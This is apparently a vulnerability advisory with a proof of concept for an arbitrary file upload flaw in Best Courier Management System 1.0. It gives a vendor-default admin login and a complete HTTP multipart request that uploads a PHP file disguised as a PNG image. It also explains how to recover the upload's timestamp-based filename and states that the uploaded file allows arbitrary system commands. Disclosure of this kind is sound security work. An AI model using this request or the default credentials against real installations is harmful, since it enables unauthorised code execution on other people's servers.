# Best Courier Management System 1.0 - Arbitrary File Upload Vulnerability
+ Exploit Authorï¼š zerrr0

# Vendor Homepage
+ [https://www.sourcecodester.com/php/16848/best-courier-management-system-project-php.html](https://www.sourcecodester.com/php/16848/best-courier-management-system-project-php.html)

# Description
+ An arbitrary file upload vulnerability in the update_user function of Best Courier Management System By mayuri_k allows attackers to execute arbitrary code via a malicious PHP file. 
+ Vulnerability file: admin_class.php

# Proof of Concept (PoC) : 
1. Login as admin using test credentials: mayuri.infospace@gmail.com/admin
3. Access the function of modifying user information and use burp suite to capture packets
4. Modify the action parameter value to update_user, and then manually add the content of the uploaded image

```http
POST /courier/ajax.php?action=update_user HTTP/1.1
Host: localhost
Content-Length: 791
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHrGhHfl5jwzwqsv0
Origin: http://localhost
Referer: http://localhost/courier/index.php?page=edit_staff&id=7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=e7frm7i5oqbhid9959955grqed
Connection: close

------WebKitFormBoundaryHrGhHfl5jwzwqsv0
Content-Disposition: form-data; name="id"

7
------WebKitFormBoundaryHrGhHfl5jwzwqsv0
Content-Disposition: form-data; name="firstname"

Mayuri
------WebKitFormBoundaryHrGhHfl5jwzwqsv0
Content-Disposition: form-data; name="lastname"

K
------WebKitFormBoundaryHrGhHfl5jwzwqsv0
Content-Disposition: form-data; name="password"


------WebKitFormBoundaryHrGhHfl5jwzwqsv0
Content-Disposition: form-data; name="email"

mayuri1@gmail.com
------WebKitFormBoundaryHrGhHfl5jwzwqsv0
Content-Disposition: form-data; name="branch_id"

9
------WebKitFormBoundaryHrGhHfl5jwzwqsv0
Content-Disposition: form-data; name="img"; filename="vulntest.php"
Content-Type: image/png

<?php phpinfo();?>
------WebKitFormBoundaryHrGhHfl5jwzwqsv0--
```
<img width="1515" alt="image" src="https://github.com/zerrr0/Zerrr0_Vulnerability/assets/101056689/09247872-344f-49de-9141-6c9f2d04409f">
<img width="1393" alt="image" src="https://github.com/zerrr0/Zerrr0_Vulnerability/assets/101056689/ae3bdf2f-e37e-4acf-99fa-53af1ff56ec4">
5. Since the uploaded image does not return the uploaded file information, you need to construct the timestamp through code to get the file name
<img width="1053" alt="image" src="https://github.com/zerrr0/Zerrr0_Vulnerability/assets/101056689/6539cee0-3672-4e81-bf5b-708a2a182898">
6. Finally, arbitrary system commands can be executed through the uploaded malicious file.
<img width="1303" alt="image" src="https://github.com/zerrr0/Zerrr0_Vulnerability/assets/101056689/d4c5a09a-0f01-4675-b1e5-bbbd178f966b">
